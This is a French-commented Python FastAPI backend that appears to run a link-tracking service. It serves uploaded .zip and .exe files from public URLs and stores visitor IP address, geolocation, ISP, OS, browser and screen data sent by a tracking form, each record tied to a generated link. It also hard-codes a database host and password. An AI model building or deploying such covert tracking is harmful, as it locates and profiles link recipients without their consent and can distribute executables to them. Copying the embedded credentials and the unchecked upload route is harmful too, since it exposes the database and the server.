from fastapi import FastAPI, UploadFile, File, HTTPException
from fastapi.responses import JSONResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
import os
import shutil
import psycopg2

# === CONFIGURATION GÉNÉRALE ===
app = FastAPI()
UPLOAD_DIR = os.path.abspath("uploaded_files")
os.makedirs(UPLOAD_DIR, exist_ok=True)

BASE_URL = os.getenv("BASE_URL", "http://localhost:8000")

DB_CONFIG = {
    "host": "tracksys_bd.onrender.com",
    "dbname": "tracksys_bd",
    "user": "postgres",
    "password": "Boucledor",
    "port": 5432
}

# === Fonction pour récupérer le dernier id_lien ===
def get_last_inserted_lien_id():
    try:
        conn = psycopg2.connect(**DB_CONFIG)
        cur = conn.cursor()
        cur.execute("SELECT id_lien FROM liens ORDER BY id_lien DESC LIMIT 1")
        result = cur.fetchone()
        cur.close()
        conn.close()
        return result[0] if result else None
    except Exception as e:
        print(f"Erreur récupération id_lien : {e}")
        return None

# === ROUTE POUR UPLOAD .ZIP ou .EXE ===
@app.post("/upload/")
async def upload_file(file: UploadFile = File(...)):
    try:
        filename = os.path.basename(file.filename)
        file_path = os.path.join(UPLOAD_DIR, filename)

        with open(file_path, "wb") as buffer:
            shutil.copyfileobj(file.file, buffer)

        file_url = f"{BASE_URL}/files/{filename}"
        return JSONResponse(content={"filename": filename, "url": file_url})
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

# === Servir les fichiers statiques ===
app.mount("/files", StaticFiles(directory=UPLOAD_DIR), name="files")

# === MODÈLE POUR LES DONNÉES DU FORMULAIRE DE TRACKING ===
class CollecteData(BaseModel):
    ip: str
    ville: str
    region: str
    pays: str
    latitude: float
    longitude: float
    fai: str
    os: str
    navigateur: str
    resolution: str
    fuseau: str
    date: str
    image_vue: str = None  # null pour lien simple

# === ROUTE DE RÉCEPTION DES INFOS COLLECTÉES ===
@app.post("/collecte")
async def collecter_infos(data: CollecteData):
    try:
        id_lien = get_last_inserted_lien_id()
        if id_lien is None:
            raise HTTPException(status_code=400, detail="Aucun lien trouvé dans la base.")

        conn = psycopg2.connect(**DB_CONFIG)
        cur = conn.cursor()

        cur.execute("""
            INSERT INTO collectes_web (
                id_lien, ip, ville, region, pays, latitude, longitude,
                fai, os, navigateur, resolution, fuseau, date_collecte, image_vue
            ) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)
        """, (
            id_lien,
            data.ip, data.ville, data.region, data.pays,
            data.latitude, data.longitude, data.fai,
            data.os, data.navigateur, data.resolution,
            data.fuseau, data.date, data.image_vue
        ))

        conn.commit()
        cur.close()
        conn.close()

        return {"status": "success", "message": "Collecte enregistrée avec succès"}

    except Exception as e:
        return JSONResponse(status_code=500, content={"error": str(e)})
